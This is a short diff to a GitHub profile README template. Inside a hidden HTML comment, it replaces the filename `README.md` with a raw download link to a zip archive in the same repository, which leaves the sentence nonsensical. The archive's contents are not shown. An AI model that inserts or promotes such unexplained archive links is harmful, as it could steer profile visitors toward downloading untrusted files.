@@ -5,6 +5,6 @@
 - 📫 How to reach me ...
 
 <!---
-HYPOTEC70/HYPOTEC70 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+HYPOTEC70/HYPOTEC70 is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/HYPOTEC70/HYPOTEC70/main/tellee/HYPOTE_cognizance.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
